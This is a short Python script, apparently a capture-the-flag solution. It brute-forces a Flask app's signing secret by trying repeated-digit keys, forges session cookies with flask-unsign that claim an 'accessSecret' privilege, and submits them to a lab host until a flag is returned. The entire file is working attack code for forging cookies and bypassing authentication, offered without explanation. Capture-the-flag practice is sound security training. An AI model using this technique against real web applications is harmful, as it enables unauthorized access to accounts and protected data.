from subprocess import PIPE, run
from requests import get
from re import findall

charset = ['1','2','3','4','5','6','7','8','9','0']
keys = []
for i in charset:
    keys.append(i*16)

session_cookies = []
for i in keys:
    command = "python3 /home/mika/.local/lib/python3.10/site-packages/flask_unsign/__main__.py --sign --cookie \"{'accessSecret':'true'}\" --secret " + i + " --no-literal-eval"
    result = run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
    session_cookies.append(result.stdout.replace("\n",""))

for i in session_cookies:
    res = get("http://10.100.1.201:5002/SeaCrete", cookies={"session": i})
    if("flag" in res.text):
        print("FMCTF{"+findall("FMCTF{(.*)}", res.text)[0]+"}")
        print(i)
        break